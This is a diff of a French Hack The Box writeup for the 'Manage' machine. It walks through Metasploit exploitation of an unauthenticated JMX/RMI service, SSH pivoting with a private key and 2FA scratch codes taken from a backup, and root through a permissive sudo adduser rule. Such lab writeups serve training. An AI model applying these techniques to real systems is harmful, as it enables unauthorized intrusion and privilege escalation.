@@ -12,9 +12,9 @@ draft: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Tomcat mal configuré (RMI/JMX), exploitation via Metasploit, pivot SSH via backup, puis root via sudo."
+summary: "Tomcat exposé via RMI/JMX, exploitation Metasploit, pivot SSH via backup puis accès root avec sudo adduser."
 description: "Writeup Manage (HTB Easy) : énumération Tomcat 8080, découverte RMI/JMX, exploitation JMX (Metasploit), pivot via backup+clé SSH, puis root via sudo adduser."
-tags: ["HTB Easy","Tomcat","RMI","JMX","Metasploit","SSH key","sudo adduser"]
+tags: ["HTB Easy","Tomcat","RMI","JMX","Metasploit","SSH","adduser"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -66,9 +66,11 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Au premier abord, les scans Nmap classiques ne révèlent rien d’exploitable : un Tomcat accessible sur le port 8080, quelques ports standards, aucune page intéressante dans les répertoires et aucun virtual host pertinent.
+Cette machine HTB Easy montre comment un service **JMX exposé via RMI**, un **backup contenant une clé SSH** et une **règle sudo mal configurée** peuvent conduire à une compromission complète du système.
 
-En poursuivant l’énumération avec un scan plus agressif, un élément inhabituel apparaît : deux ports associés à Java RMI (2222 et 45353).
+Au premier abord, l’énumération ne révèle rien d’immédiatement exploitable : un Tomcat accessible sur le port 8080, quelques ports ouverts, mais aucun contenu web intéressant ni virtual host pertinent.
+
+En poursuivant l’énumération avec un scan plus approfondi, un élément inhabituel apparaît : deux ports associés à **Java RMI** (2222 et 45353).
 
 Cette combinaison **Tomcat + RMI** constitue une piste intéressante. Elle suggère la présence d’un accès **JMX potentiellement mal sécurisé**, qui va rapidement s’avérer être la clé de l’exploitation de la machine.
 
@@ -77,46 +79,11 @@ Cette combinaison **Tomcat + RMI** constitue une piste intéressante. Elle sugg�
 
 Ton objectif devient : confirmer la présence de jmxrmi dans le registre RMI, puis exploiter l’endpoint JMX exposé.
 
-Tu vas obtenir un foothold via JMX, récupérer un backup avec une clé SSH pour pivoter, puis finir par une élévation via sudo/adduser.
+Tu vas obtenir un **premier accès** via JMX, récupérer un backup contenant une clé SSH pour pivoter vers un nouvel utilisateur, puis terminer par une élévation de privilèges via `sudo adduser`.
 
 ## Énumération
 
-Dans un challenge **CTF Hack The Box**, tu commences **toujours** par une phase d’**énumération complète**.
-C’est une étape incontournable : elle te permet d’identifier clairement ce que la machine expose avant toute tentative d’exploitation.
-
-Concrètement, tu cherches à savoir quels **ports** sont ouverts, quels **services** sont accessibles, si une **application web** est présente, quels **répertoires** sont exposés et si des **sous-domaines ou vhosts** peuvent être exploités.
-
-Pour réaliser cette énumération de manière structurée et reproductible, tu peux t’appuyer sur trois scripts :
-
-- **{{< script "mon-nmap" >}}** : identifie les ports ouverts et les services en écoute
-- **{{< script "mon-recoweb" >}}** : énumère les répertoires et fichiers accessibles via le service web
-- **{{< script "mon-subdomains" >}}** : détecte la présence éventuelle de sous-domaines et de vhosts
-
-Tu retrouves ces outils dans la section **[Outils / Mes scripts](/mes-scripts/)**.
-Pour garantir des résultats pertinents en contexte **CTF HTB**, tu utilises une **wordlist dédiée**, installée au préalable grâce au script **{{< script "make-htb-wordlist" >}}**.
-Cette wordlist est conçue pour couvrir les technologies couramment rencontrées sur Hack The Box.
-
-------
-
-Avant de lancer les scans, vérifie que manage.htb résout bien vers la cible. Sur HTB, ça passe généralement par une entrée dans /etc/hosts.
-
-- Ajoute l’entrée `10.129.x.x   manage.htb` dans `/etc/hosts`.
-
-```bash
-sudo nano /etc/hosts
-```
-
-- Lance ensuite le script {{< script "mon-nmap" >}} pour obtenir une vue claire des ports et services exposés :
-
-```bash
-mon-nmap manage.htb
-
-# Résultats dans le répertoire scans_nmap/
-#  - scans_nmap/full_tcp_scan.txt
-#  - scans_nmap/aggressive_vuln_scan.txt
-#  - scans_nmap/cms_vuln_scan.txt
-#  - scans_nmap/udp_vuln_scan.txt
-```
+{{< enum-intro >}}
 
 ### Scan initial 
 
@@ -397,7 +364,7 @@ Port 8080 (http)
 
 ### Analyse des résultats
 
-Le scan des répertoires met en évidence un service **Tomcat** accessible sur le port **8080** :
+L’énumération web met en évidence un service **Tomcat** accessible sur le port **8080** :
 
 - `http://manage.htb:8080/` : page d’accueil Tomcat par défaut
 - plusieurs redirections **302** vers des applications internes :
@@ -409,18 +376,15 @@ Le scan des répertoires met en évidence un service **Tomcat** accessible sur l
 En approfondissant l’analyse de `/docs` et `/examples` à l’aide de scans `mon-recoweb` ciblés, aucun contenu applicatif intéressant n’est découvert.  
 Ces chemins hébergent uniquement la documentation et les exemples standards de Tomcat, sans application spécifique ni interface d’administration personnalisée.
 
----
-
 Le scan Nmap agressif apporte en revanche des informations beaucoup plus intéressantes :
 
 - **Tomcat 10.1.19** est confirmé sur **8080/tcp**
 - deux services **Java RMI** sont exposés sur **2222/tcp** et **45353/tcp**
 - aucun script `http-vuln-*` ne révèle de vulnérabilité web classique
 
-Point clé : le scan parvient à **interroger le registre RMI**.  
-Cela signifie que le service ne met en place **ni authentification**, **ni politique de sécurité**, **ni filtrage IP**.
+Point clé : le scan parvient à **interroger le registre RMI**.
 
----
+Cela indique que le registre répond aux requêtes distantes et qu’une partie de l’interface RMI est accessible sans protection apparente.
 
 Dès l’apparition de `jmxrmi`, plusieurs éléments deviennent clairs :
 
@@ -429,8 +393,6 @@ Dès l’apparition de `jmxrmi`, plusieurs éléments deviennent clairs :
   - elle est très probablement exploitable à distance
 
   Ce type de configuration ouvre typiquement la voie à une exploitation via le module Metasploit `java_jmx_server`.
-
----
 
 À ce stade, il est logique de recentrer l’analyse sur :
 
@@ -464,25 +426,29 @@ Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
 Sur cette machine, le script montre clairement que le serveur **RMI accepte des connexions distantes sans authentification**.  
 L’entrée `jmxrmi` est accessible, ce qui indique une interface **JMX exposée** et **mal sécurisée**.
 
-Dans ce contexte, une interface JMX ouverte vers l’extérieur équivaut pratiquement à une **exécution de code à distance** : JMX permet en effet de charger des classes Java et d’exécuter du code si aucune protection n’est en place.
+Dans ce contexte, une interface **JMX exposée** devient rapidement critique :  
+elle permet notamment de charger des classes Java à distance et d’exécuter du code si aucune authentification ou restriction n’est configurée.
 
----
-
-Si tu cherches `Metasploit + JMX + RMI`, tu tombes rapidement sur un module pertinent :
+Dans ce contexte, un module Metasploit correspond précisément à ce scénario :
 
 - **Java JMX Server Insecure Configuration Java Code Execution**
   - **Module** : `exploit/multi/misc/java_jmx_server`
+  
   - **Description** : ce module exploite une configuration JMX non sécurisée en chargeant des classes Java depuis une URL HTTP distante.  
     Il fonctionne lorsque l’interface JMX est exposée **sans authentification**, ou avec une configuration faible (par exemple lorsque `com.sun.management.jmxremote.authenticate=false`).
-  - **Source** :  
-    <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>
-
----
+    
+  - **Source** :  [Pentester Academy](https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7)
+  
+    
 
 Cette confirmation permet de passer logiquement à l’étape suivante :  
 tester le module Metasploit `java_jmx_server`, qui devrait fournir un premier accès à la machine sous la forme d’un **shell Meterpreter**.
 
 ### Metasploit
+
+Pour exploiter cette configuration, tu peux utiliser le module Metasploit dédié aux serveurs **JMX exposés sans authentification**.
+
+Ce module va charger une classe Java malveillante via HTTP et exécuter le payload sur le serveur distant.
 
 Lance Metasploit et charge le module `java_jmx_server` :
 
@@ -586,6 +552,10 @@ msf exploit(multi/misc/java_jmx_server) > exploit
 meterpreter >
 ```
 
+
+
+Le module ouvre une session **Meterpreter** sur la machine cible avec les droits de l’utilisateur **tomcat**, ce qui te permet d’obtenir un premier accès au système.
+
 ### user.txt
 
 - Une fois le shell obtenu, tu peux explorer le système de fichiers et tu trouves facilement le flag **user.txt**.
@@ -605,7 +575,9 @@ a86dxxxxxxxxxxxxxxxxxxxxxxxxxxxx279
 
 - En poursuivant l’exploration du système, tu identifies les répertoires personnels de deux utilisateurs : **karl** et **useradmin**.  
 - Ces deux *home directories* sont accessibles avec les droits de l’utilisateur **tomcat**, ce qui élargit clairement la surface d’attaque pour la suite de l’escalade.
-- L'exploration de /home/karl ne donne rien d'intéressant
+- L’exploration du répertoire `/home/karl` ne révèle cependant aucun élément exploitable.
+
+
 
 ```bash
 meterpreter > ls -la /home/karl
@@ -684,14 +656,11 @@ meterpreter >
 
 
 
-### Exploitation de backup.tar.gz dans Kali Linux
+### Analyse du backup dans Kali
+
+Tu peux maintenant extraire l’archive afin d’examiner son contenu et identifier les fichiers potentiellement sensibles.
 
 ```bash
-ls -l
-total 4
--rw-r--r-- 1 kali kali 3088 Jun 21  2024 backup.tar.gz
-drwxr-xr-x 2 kali kali    0 Nov 19 16:17 scans_nmap
-                                                                                                                       
 tar -xvzf backup.tar.gz
 ./
 ./.bash_logout
@@ -722,10 +691,12 @@ drwxr-xr-x 2 kali kali    0 Nov 19 16:17 scans_nmap
 drwxr-xr-x 2 kali kali    0 Jun 21  2024 .ssh
                                                                                        
 ```
-Même si tar retourne une erreur à cause d’un symlink (`.bash_history -> /dev/null`), l’extraction des fichiers utiles (dont `.ssh/id_ed25519`) a bien eu lieu
+Même si `tar` affiche une erreur liée à un lien symbolique (`.bash_history -> /dev/null`), l’extraction s’est bien déroulée et les fichiers utiles — notamment `.ssh/id_ed25519` — sont correctement récupérés.
 
 - En explorant le contenu de l’archive, tu remarques la présence d’un fichier **.google_authenticator**.  
-- Ce type de fichier mérite une attention particulière, car il est généralement lié à la configuration d’une authentification à deux facteurs (2FA).
+- Ce type de fichier mérite une attention particulière, car il est généralement associé à une configuration d’authentification à deux facteurs (**2FA**).
+
+
 
 ```bash
 cat .google_authenticator                   
@@ -761,13 +732,9 @@ drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 
 ```
 
+### Connexion SSH avec la clé récupérée
 
 
----
-
-## Escalade de privilèges
-
-### Connexion à manage.htb
 
 ```bash
 cp ./.ssh/id_ed25519* /home/kali/tmp/
@@ -782,7 +749,8 @@ ssh -i id_ed25519 useradmin@manage.htb
 
 - Lors de la connexion, un **Verification code** est demandé.  
 - Tu peux utiliser l’un des codes présents dans le fichier **.google_authenticator**, par exemple le premier code disponible : **99852083**.
-- Ces codes sont des *scratch codes* utilisables une seule fois
+- Ces codes correspondent à des **scratch codes** générés par Google Authenticator. 
+  Ils servent de **codes de secours** et peuvent être utilisés **une seule fois** lorsque l’application 2FA n’est pas disponible.
 
 ```bash
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)
@@ -821,11 +789,15 @@ To check for new updates run: sudo apt update
 useradmin@manage:~$
 ```
 
-Une fois connecté en SSH en tant que `useradmin`, tu appliques la méthodologie décrite dans la recette {{< recette "privilege-escalation-linux" >}}.
+Tu disposes maintenant d’un accès SSH interactif en tant que **useradmin**, ce qui permet de poursuivre l’analyse locale afin de rechercher une élévation de privilèges.
+
+## Escalade de privilèges
+
+{{< escalade-intro user="useradmin" >}}
 
 ### Sudo -l
 
-La première étape consiste toujours à vérifier les droits `sudo` :
+Tu commences toujours par vérifier les droits <code>sudo</code> :
 
 
 ```bash
@@ -842,43 +814,31 @@ User useradmin may run the following commands on manage:
 
 ### Création de l’utilisateur admin
 
-  La sortie de `sudo -l` révèle une règle intéressante :
+La sortie de `sudo -l` révèle une règle intéressante :
 
-  - **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$**
+- **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$**
 
-  Cette règle autorise l’utilisateur **useradmin** à exécuter la commande `adduser` **sans mot de passe**, à condition que l’argument fourni soit strictement alphanumérique.
+Cette règle autorise l’utilisateur **useradmin** à exécuter la commande `adduser` **sans mot de passe**, à condition que le nom du nouvel utilisateur soit strictement alphanumérique.
 
-  Cette contrainte empêche toute tentative directe d’ajout à un groupe privilégié (comme `sudo` ou `adm`), puisqu’il est impossible de passer des options supplémentaires à la commande.
+Cette contrainte empêche d’ajouter directement des options à la commande.
 
----
+Lorsqu’un utilisateur est créé sous Ubuntu avec `adduser`, un **groupe du même nom** est également créé automatiquement.
 
-  En revanche, un détail important entre en jeu :  
-  lorsqu’un utilisateur est créé sous Ubuntu, **un groupe du même nom est automatiquement créé**.
+En créant un utilisateur nommé **admin**, le système crée donc aussi un groupe **admin**.
 
-  En créant un utilisateur nommé **admin** :
+Sur cette machine, ce groupe dispose encore de privilèges **sudo**, ce qui permet au nouvel utilisateur d’exécuter des commandes avec les privilèges root.
 
-  - le groupe **admin** est créé automatiquement
-  - **historiquement**, sur Ubuntu, le groupe `admin` fait partie des *sudoers*
-  - ce groupe dispose donc de privilèges équivalents à ceux du groupe `sudo`
+> **Important — contexte spécifique à cette machine**
+>
+> Sur les versions récentes d’Ubuntu, le groupe `admin` n’est généralement plus utilisé par défaut et a été remplacé par le groupe `sudo`.  
+> Sur la machine **Manage**, la configuration conserve encore les privilèges `sudo` pour le groupe `admin`, ce qui rend cette élévation possible ici.
 
-  
+**Résultat :**
 
-  ⚠️ **Important — contexte spécifique à cette machine**
-
-  Sur les versions récentes d’Ubuntu, le groupe `admin` n’est généralement **plus** présent dans la configuration sudo par défaut, remplacé par le groupe `sudo`.
-
-  **Dans le contexte précis de la machine Manage**, le système est suffisamment ancien (et/ou configuré) pour que le groupe `admin` dispose encore de privilèges sudo, ce qui rend cette élévation possible **ici**, mais **non généralisable** à d’autres environnements.
-
-  
-
----
-
-  **Résultat :  
-  l'utilisateur admin nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement, sans aucune autre exploitation.**
+L’utilisateur **admin** nouvellement créé peut exécuter `sudo -i` et obtenir un shell **root** immédiatement.
 
 
 ```bash
-
 useradmin@manage:~$ sudo adduser admin
 Adding user `admin' ...
 Adding new group `admin' (1003) ...
@@ -897,7 +857,6 @@ Enter the new value, or press ENTER for the default
 	Other []: 
 Is the information correct? [Y/n] 
 useradmin@manage:~$
-
 ```
 
 ### Bascule vers l’utilisateur admin
@@ -925,19 +884,16 @@ root@manage:~# cat root.txt
 b364xxxxxxxxxxxxxxxxxxxxxxxxdc34
 ```
 
-
-
----
-
 ## Conclusion
 
-Cette machine illustre une chaîne d’exploitation cohérente centrée sur **Tomcat** : un simple service **RMI/JMX exposé** suffit à injecter du code distant et à obtenir un premier accès via Metasploit.
+Cette machine illustre une chaîne d’exploitation cohérente autour d’un service d’administration **Java mal sécurisé**.
 
-En poursuivant l’exploration, tu découvres un **backup mal protégé** contenant une clé SSH valide, ce qui permet de basculer vers l’utilisateur *useradmin*.
+L’accès **JMX exposé via RMI** permet d’obtenir un premier shell sur la machine grâce à Metasploit.  
+L’exploration locale révèle ensuite un **backup mal protégé** contenant une clé SSH privée ainsi que les éléments nécessaires pour contourner l’authentification à deux facteurs.
 
-Enfin, l’analyse de `sudo -l` met en évidence une configuration trop permissive du binaire `adduser`.  Elle permet de créer un compte *admin* automatiquement doté de privilèges élevés, conduisant directement à l’obtention d’un accès **root**.
+Enfin, l’analyse des droits **sudo** met en évidence une règle trop permissive autour de la commande `adduser`.  
 
----
+**La création d’un utilisateur `admin` permet alors d’obtenir directement un accès root et de finaliser l’exploitation de la machine.**
 
 ---
 
